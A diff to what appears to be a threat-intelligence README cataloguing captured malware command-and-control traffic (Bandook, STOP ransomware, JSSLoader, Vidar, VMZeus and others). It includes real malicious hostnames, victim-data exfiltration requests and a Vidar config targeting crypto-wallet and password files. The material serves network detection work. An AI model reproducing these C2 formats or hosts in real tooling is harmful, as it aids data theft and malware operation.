@@ -128,6 +128,23 @@ J/.8/.:/.</.?/.>O.(8.I/.>/.9/.>K.>8.N/.I/.;/.</.;N.>:.NL.?N.>8.(9.L/.8/.</.4/.4/
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/azorult.png "Azorult")
 
+#### Bandook RAT
+~~~
+00000000  64 4f 7a 54 30 46 72 56  44 51 4c 30 6f 32 49 48   dOzT0FrV DQL0o2IH
+00000010  6f 70 46 6c 31 69 37 48  4c 35 48 48 54 4f 6e 66   opFl1i7H L5HHTOnf
+00000020  6f 30 55 72 6a 47 7a 48  30 61 30 4f 62 54 37 69   o0UrjGzH 0a0ObT7i
+00000030  45 42 64 2b 54 4e 6a 4f  72 77 74 44 6d 4c 57 52   EBd+TNjO rwtDmLWR
+00000040  59 54 68 6f 36 6b 4c 2f  42 38 33 43 4d 75 49 2b   YTho6kL/ B83CMuI+
+00000050  6e 34 46 5a 55 66 49 4a  2f 70 6e 31 32 6a 62 73   n4FZUfIJ /pn12jbs
+00000060  4c 2f 4c 79 54 73 42 73  76 63 48 66 6e 6b 4a 53   L/LyTsBs vcHfnkJS
+00000070  5a 6a 6b 4b 59 34 2b 54  4b 48 44 76 6c 54 32 52   ZjkKY4+T KHDvlT2R
+00000080  59 57 69 59 4a 70 54 48  6d 70 68 4f 70 51 4d 47   YWiYJpTH mphOpQMG
+00000090  6d 77 3d 3d 26 26 26                               mw==&&&
+    00000000  64 4f 7a 54 30 46 6f 3d                            dOzT0Fo= 
+00000097  64 4f 7a 54 30 46 76 56  44 51 3d 3d 26 26 26      dOzT0FvV DQ==&&&
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/bandook.png "Bandook")
+
 #### Bitter RAT (Patchwork)
 ~~~
 GET /ourtyaz/qwe.php?TIe=%3a116%3ad48.2431.52b5.c69e.3c86b%3a961e3g*Vtfs.QD*%3aACme%3b%217%2f2%2f8712%21Tfswjdf%21Qbdl%212 HTTP/1.1
@@ -407,6 +424,32 @@ kyMjI5loUABYmLgimiKQCLDyklKqUpqSoqpjBAMjIw==
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/exilerat.png "Exilerat")
 
+#### Expiro
+~~~
+POST dovamnabihede.ws HTTP/1.1
+User-Agent: Mozilla/4.0 (Compatible; msie 44; NT6.1.7601-90376708.ENU.3DA43F52-83C788-FF5FFC-15DD1711; .NET CLR 00000000/00000000)
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/expiro.png "Expiro")
+
+#### Filecoder.STOP
+~~~
+GET /As73yhsyU34578hxxx/SDf565g/get.php?pid=2485E9F082250E269EA0EF635E0D382D&first=true HTTP/1.1
+User-Agent: Microsoft Internet Explorer
+Host: ring1.ug
+
+HTTP/1.1 200 OK
+Date: Fri, 25 Oct 2019 13:26:11 GMT
+Server: Apache/2.4.37 (Win64) PHP/5.6.40
+X-Powered-By: PHP/5.6.40
+Content-Length: 562
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+{"public_key":"-----BEGIN&#160;PUBLIC&#160;KEY-----\\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA5pjgODTtZORmS4jeVWQV\\nvs71Fz\/NH7IWyR7an0L+rLo1S7Jrqn64J8LXlT\/1eiDN87tYle5AlB4\/vmf4Uo98\\ncMG\/E+NbFLtyRyxTq4RmaNDjyvTPIXbBl+cMU4yIwBKT89D8tuD6PhdfVVjMx71l\\niEPtuNb5pD38EYGv\/3+Yrwvg3sU1+aiIWdZgPX3ieFxAL3ZZkvlr5\/XeNpKqGAiT\\n6YBjLZg7R\/5j5Knhex+gKUR2Gkh2CG7mWqjcaNUK9Hzkgk3\/UmqopxokpSTkHmUT\\nSlN5mKAg438TmIUz4MCnnieexOtpcg7Fmn2wPObgdIG3OXK5yfxxExa+TBDTbCFc\\ngQIDAQAB\\n-----END&#160;PUBLIC&#160;KEY-----\\n","id":"Em9SPAhlG3hXHt713xEY92niynachhsXeWwCv6cB"}
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/stopfilecoder.png "Expiro")
+
+
 #### Fin7 JS Backdoor
 ~~~
 POST /pictures/delete?type=name HTTP/1.1
@@ -658,6 +701,21 @@ Server: LiteSpeed
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/isrstealer.png "ISRStealer")
 
+#### JSSLoader
+~~~
+POST /gate.php?bot_id=JenniferPCJENNIFERPCVMware564db87746ebb934e9e0b94b413682b8 HTTP/1.1
+Content-Type: application/json
+Host: dempoloka.com
+Content-Length: 242
+Expect: 100-continue
+Connection: Keep-Alive
+
+AAAAAA==
+AQAAAA==
+VGhlIGlucHV0IGlzIG5vdCBhIHZhbGlkIEJhc2UtNjQgc3RyaW5nIGFzIGl0IGNvbnRhaW5zIGEgbm9uLWJhc2UgNjQgY2hhcmFjdGVyLCBtb3JlIHRoYW4gdHdvIHBhZGRpbmcgY2hhcmFjdGVycywgb3IgYW4gaWxsZWdhbCBjaGFyYWN0ZXIgYW1vbmcgdGhlIHBhZGRpbmcgY2hhcmFjdGVycy4g
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/jssloader.png "JSSLoader")
+
 #### Keybase
 ~~~
 GET /panel/post.php?type=passwords&machinename=USER-PC&application=MS%20Outlook%202002/2003/2007/2010&link=192.168.1.1&username=honey@pot.com&password=honeypass356 HTTP/1.1
@@ -799,7 +857,26 @@ Keep-Alive: timeout=5, max=100
 Connection: Keep-Alive
 Content-Type: text/html; charset=UTF-8
 ~~~
+~~~
+POST /hooponopono/puma.php HTTP/1.0
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 158
+Host: leavenois.com
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-Agent: Mozilla/3.0 (compatible; Indy Library)
+
+vv=OP22--22-10&vw=&mods=&uname=VVNFUi1QQw%3D%3D&cname=Ti05Ng%3D%3D&os=V2luZG93cyA3IFByb2Zlc3Npb25hbDYuMTc2MDEtNjQ%3D&is=&iss=SUUuQXNzb2NGaWxlLkhUTQ%3D%3D&iav=
+
+HTTP/1.0 200 OK
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+Content-Length: 0
+Date: Tue, 22 Oct 2019 20:06:32 GMT
+Server: LiteSpeed
+~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/metamorpho.png "Metamorpho")
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/metamorfo-1.png "Metamorpho")
 
 #### MilkyBoy
 ~~~
@@ -1309,6 +1386,13 @@ f...Y.[.V.......G.*"...Ig..Y...k=}..}..U....@....T..n.-)7Z.Yt..%...$.P.vQ....p.z
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/predator.png "Predator")
 
+#### Proyecto (aka Nemours) RAT
+~~~
+0|New - 25-10-19/21:41|United States|USER-PC - admin|Windows 7 Professional - 32 Bits / Intel(R) Core(TM) i5-6400 CPU @ 2.70GHz / 4 /  / 0|US|0|192.168.100.60|0 Cap.|oolkth|9090|OFF| - 0 / || Tiene Capturas de: |New - |||No Available
+13|Program Manager|OFF|OFF - 0 / ||
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/proyecto.png "Proyecto")
+
 #### Pyrogenic
 flah on "53 E1 6D D3 9E EE 45 D4" on iniial connection, 175 bytes
 ~~~
@@ -1725,8 +1809,34 @@ M....u..f..<..^..ek/.[...2...P=...3....>.................9J.V&.6..<....f.}......
 .......5.../History/history_Mozilla Firefox_nltxvmn2.default.txtUT
 .....]...]...]..+.......PK........0.HO..M(.....	....../information.txtUT
 ~~~
+~~~
+POST /517 HTTP/1.1
+Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1
+Accept-Language: ru-RU,ru;q=0.9,en;q=0.8
+Accept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1
+Accept-Encoding: deflate, gzip, x-gzip, identity, *;q=0
+Content-Type: multipart/form-data; boundary=1BEF0A57BE110FD467A
+Content-Length: 25
+Host: neroolive.org
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+--1BEF0A57BE110FD467A--
+
+HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 25 Oct 2019 13:27:12 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+Vary: Accept-Encoding
+Content-Encoding: gzip
+
+1,1,1,1,1,1,1,1,1,1,250,DESKTOP;%DESKTOP%\;*wallet*.*:*2fa*.*:*backup*.txt:*backup*.png:*backup*.jpg:*code*.txt:*code*.png:*code*.jpg:*password*.*:*auth*.txt:*auth*.png:*auth*.jpg:*crypto*.*:*key*.txt:*key*.png:*key*.jpg:*ledger*.*:*metamask*.*:*blockchain*.*:*bittrex*.*:*binance*.*:*coinbase*.*:*trezor*.*:*exodus*.*;300;true;movies:music:mp3;lnk;Exodus;%APPDATA%\Roaming\Exodus;*.*;4000;true;movies:music:mp3;JAXX;%APPDATA%\Roaming\Jaxx;*.*;4000;true;movies:music:mp3;
+~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/vidar-1.png "Vidar")
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/vidar-2.png "Vidar")
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/vidar-3.png "Vidar")
 
 #### Vjworm vjw0rm
 ~~~
@@ -1741,6 +1851,36 @@ Connection: Keep-Alive
 Cache-Control: no-cache
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/vjworm.png "VJworm")
+
+#### VMZeus
+~~~
+POST /n/file.php HTTP/1.1
+Accept: */*
+User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
+Host: baloobafoudanitojahdge.space
+Content-Length: 133
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+.qrK.9..z..q.....W.I&....k
+..Y..'.LP.....RB....sRZ....].^.G...*e..9.....l.......R..G...F$C.D.)..1...9O!7z.x..?..Qb..A.K.... ..Yu..A..
+
+HTTP/1.1 200 OK
+Date: Mon, 21 Oct 2019 12:06:57 GMT
+Content-Type: application/octet-stream
+Content-Length: 14064
+Connection: keep-alive
+Set-Cookie: __cfduid=dea0842185ed1d3224d3d743e5e7e7ccd1571659617; expires=Tue, 20-Oct-20 12:06:57 GMT; path=/; domain=.baloobafoudanitojahdge.space; HttpOnly
+X-Powered-By: PHP/5.6.40
+Cache-Control: public
+Content-Disposition: attachment; filename="%2e/files/bolka.xml"
+Content-Transfer-Encoding: binary
+CF-Cache-Status: DYNAMIC
+Expect-CT: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
+Server: cloudflare
+CF-RAY: 52931bc13d868eb3-DME
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/vmzeus.png "VMZeus")
 
 ### Unknowns
 #################################################################################################
